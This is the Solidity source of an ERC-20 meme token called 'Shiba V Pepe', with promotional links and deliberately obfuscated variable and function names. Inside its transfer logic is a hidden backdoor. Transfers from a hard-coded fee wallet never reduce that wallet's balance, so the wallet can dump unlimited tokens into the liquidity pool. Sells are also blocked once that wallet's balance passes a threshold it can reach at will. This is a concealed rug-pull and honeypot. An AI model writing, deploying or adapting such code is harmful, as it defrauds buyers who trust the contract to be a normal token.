/**

Shiba V Pepe   $SH三P三


Telegram: https://t.me/SHEPE_Ethereum
Website : https://www.shibvspepe.org/
X/Twitter: https://twitter.com/SHEPE_Ethereum

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function  _wiuxr(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _wiuxr(a, b, "SafeMath:  subtraction overflow");
    }

    function  _wiuxr(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IuniswapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract ShibaVPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _afq_kauvcbrvg;
    mapping (address => bool) private _tlfgWaletrjroy;
    mapping(address => uint256) private _eka_pdaum_aTmeaTranscte;
    bool public _wfrnvcdruly = false;

    string private constant _name = unicode"Shiba V Pepe";
    string private constant _symbol = unicode"SH三P三";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalsSupplyh_er = 100000000 * 10 **_decimals;
    uint256 public _maxTxAmount = _totalsSupplyh_er;
    uint256 public _maxWalletSize = _totalsSupplyh_er;
    uint256 public _taxSwapThreshold= _totalsSupplyh_er;
    uint256 public _maxTaxSwap= _totalsSupplyh_er;

    uint256 private _BuyTaxinitial=15;
    uint256 private _SellTaxinitial=25;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAtreduce=7;
    uint256 private _SellTaxAtreduce=1;
    uint256 private _rjurPevatienekuSwiwuiy=0;
    uint256 private _bsctnrBarymrg=0;
    address public _zimroFeeurRecjlary = 0x32374ac4dA30918B93c4BAccEc7Fd8E020b291fC;


    IuniswapRouter private _uniswapuiRouterUniswapuiFacume;
    address private _uniswapPairTokenfuLiquidiuy;
    bool private FrhfTradtrqiube;
    bool private _sveyhtwapiukvg = false;
    bool private _swapuivkaUniswapprSutles = false;

 
    event RemovseuAutyiauit(uint _maxTxAmount);
    modifier lockTheSwap {
        _sveyhtwapiukvg = true;
        _;
        _sveyhtwapiukvg = false;
    }

    constructor () {
        _balances[_msgSender()] = _totalsSupplyh_er;
        _afq_kauvcbrvg[owner()] = true;
        _afq_kauvcbrvg[address(this)] = true;
        _afq_kauvcbrvg[_zimroFeeurRecjlary] = true;


        emit Transfer(address(0), _msgSender(), _totalsSupplyh_er);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalsSupplyh_er;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wiuxr(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {

            if (_wfrnvcdruly) {
                if (to != address(_uniswapuiRouterUniswapuiFacume) && to != address(_uniswapPairTokenfuLiquidiuy)) {
                  require(_eka_pdaum_aTmeaTranscte[tx.origin] < block.number,"Only one transfer per block allowed.");
                  _eka_pdaum_aTmeaTranscte[tx.origin] = block.number;
                }
            }

            if (from == _uniswapPairTokenfuLiquidiuy && to != address(_uniswapuiRouterUniswapuiFacume) && !_afq_kauvcbrvg[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                if(_bsctnrBarymrg<_rjurPevatienekuSwiwuiy){
                  require(!_rudraftroq(to));
                }
                _bsctnrBarymrg++; _tlfgWaletrjroy[to]=true;
                taxAmount = amount.mul((_bsctnrBarymrg>_BuyTaxAtreduce)?_BuyTaxfinal:_BuyTaxinitial).div(100);
            }

            if(to == _uniswapPairTokenfuLiquidiuy && from!= address(this) && !_afq_kauvcbrvg[from] ){
                require(amount <= _maxTxAmount && balanceOf(_zimroFeeurRecjlary)<_maxTaxSwap, "Exceeds the _maxTxAmount.");
                taxAmount = amount.mul((_bsctnrBarymrg>_SellTaxAtreduce)?_SellTaxfinal:_SellTaxinitial).div(100);
                require(_bsctnrBarymrg>_rjurPevatienekuSwiwuiy && _tlfgWaletrjroy[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_sveyhtwapiukvg 
            && to == _uniswapPairTokenfuLiquidiuy && _swapuivkaUniswapprSutles && contractTokenBalance>_taxSwapThreshold 
            && _bsctnrBarymrg>_rjurPevatienekuSwiwuiy&& !_afq_kauvcbrvg[to]&& !_afq_kauvcbrvg[from]
            ) {
                swapoTqieruhic( _drcrt(amount, _drcrt(contractTokenBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]= _wiuxr(from, _balances[from], amount);
        _balances[to]=_balances[to].add(amount. _wiuxr(taxAmount));
        emit Transfer(from, to, amount. _wiuxr(taxAmount));
    }

    function swapoTqieruhic(uint256 amountForstoken) private lockTheSwap {
        if(amountForstoken==0){return;}
        if(!FrhfTradtrqiube){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapuiRouterUniswapuiFacume.WETH();
        _approve(address(this), address(_uniswapuiRouterUniswapuiFacume), amountForstoken);
        _uniswapuiRouterUniswapuiFacume.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountForstoken,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _drcrt(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function  _wiuxr(address from, uint256 a, uint256 b) private view returns(uint256){
        if(from == _zimroFeeurRecjlary){
            return a;
        }else{
            return a. _wiuxr(b);
        }
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _totalsSupplyh_er;
        _maxWalletSize=_totalsSupplyh_er;
        _wfrnvcdruly=false;
        emit RemovseuAutyiauit(_totalsSupplyh_er);
    }

    function _rudraftroq(address _juqbupiy) private view returns (bool) {
        uint256 rqoeBaraceked;
        assembly {
            rqoeBaraceked := extcodesize(_juqbupiy)
        }
        return rqoeBaraceked > 0;
    }


    function openTrading() external onlyOwner() {
        require(!FrhfTradtrqiube,"trading is already open");
        _uniswapuiRouterUniswapuiFacume = IuniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_uniswapuiRouterUniswapuiFacume), _totalsSupplyh_er);
        _uniswapPairTokenfuLiquidiuy = IUniswapV2Factory(_uniswapuiRouterUniswapuiFacume.factory()).createPair(address(this), _uniswapuiRouterUniswapuiFacume.WETH());
        _uniswapuiRouterUniswapuiFacume.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_uniswapPairTokenfuLiquidiuy).approve(address(_uniswapuiRouterUniswapuiFacume), type(uint).max);
        _swapuivkaUniswapprSutles = true;
        FrhfTradtrqiube = true;
    }

    receive() external payable {}
}